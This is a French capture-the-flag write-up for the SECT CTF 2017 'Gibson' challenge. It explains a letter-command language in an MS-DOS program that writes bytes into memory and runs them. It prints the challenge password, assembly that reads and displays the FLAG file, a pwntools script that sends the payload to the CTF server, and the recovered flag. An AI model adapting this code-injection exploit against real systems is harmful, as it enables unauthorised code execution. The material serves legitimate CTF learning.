Ce programme est un programme MSDOS .COM en 16 bits.

Il commence par demander un mot de passe (HACKTHEPLANET) puis propose de charger
en mémoire à partir de l'adresse 0x19a un code suivante une règle simple:

                cmp     al, 0Ah         ; line feed -> stop
                jz      short loc_9A
                cmp     al, 41h ; 'A'   ; A -> BX ++
                jz      short loc_76
                cmp     al, 42h ; 'B'   ; B -> BX--
                jz      short loc_7B
                cmp     al, 43h ; 'C'   ; C -> CX--
                jz      short loc_80
                cmp     al, 44h ; 'D'   ; D -> CX++
                jz      short loc_85
                cmp     al, 45h ; 'E'   ; E : [BX] <- CX
                jz      short loc_8A
                jmp     short loc_58

En jouant avec ces lettres on peut donc faire un programme MSDOS et l'éxécuter

Le programme suivant liit le fichier FLAG et l'affiche à l'écran

org 019ah
[BITS 16]
	mov ah,3dh
	mov al,0h
	mov dx,nom
	push ds
	pop es
	mov cx,0
	mov si,0
	mov di,0
	int 21h	; le fichier est ouvert
	mov bx,ax
	mov dx,buf
	mov ah,3fh
	mov cx,100h
	int 21h			; on l lit dans la DTA
	mov dx,buf
	mov ah,9
	int 21h
	mov ah,4Ch
	int 21h
nom:
	db	"FLAG",0
buf:
	db	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"$"


(le $ est là pour s'assurer que la chaine sera afficher correctement).

Le programme python suivant transcrit le fichier .com obtenu par nasm en
commandes pour Gibson et lui transmet.

#!/usr/bin/python
import sys
from pwn import *
from time import sleep

if (len(sys.argv)>1):
    f=open(sys.argv[1],"r")
    final=f.read()
    f.close()

bx=0x19a
cx=0x0
s=""
for i in range(len(final)):
    c=ord(final[i])
#    print hex(c),
    if (c < cx):
        s=s+"C"*(cx-c)
        cx=c
    elif (c>cx):
        s=s+"D"*(c-cx)
        cx=c
    s=s+"EA"
    bx=bx+1
s=s+"\r\n"
print s
for i in range(3):
    p=remote("pwn.sect.ctf.rocks", 4444)
    sleep(2)
    p.sendline("\n")
    sleep(5)
    p.sendline("HACKTHEPLANET")
    sleep(0.5)
    sleep(0.5)
    p.send(s)
    print p.recvall(120)
    p.close()


Il est executée 3 fois parce que des difficultés de transmission ont eu lieu.

La sortie est récupérée par wireshark.

On récupère le flag comme suit:

francois@aramis:~/BFF/ctfrocks2017/Gibson$ strings essai6.pcapng  | grep SECT
M*USECT{MEMBER_MSDOS_I_MEMBER}
[22;1HOK! BACKDOOR CMD: SECT{MEMBER_MSDOS_I_MEMBER}
francois@aramis:~/BFF/ctfrocks2017/Gibson$ 

Réponse: SECT{MEMBER_MSDOS_I_MEMBER}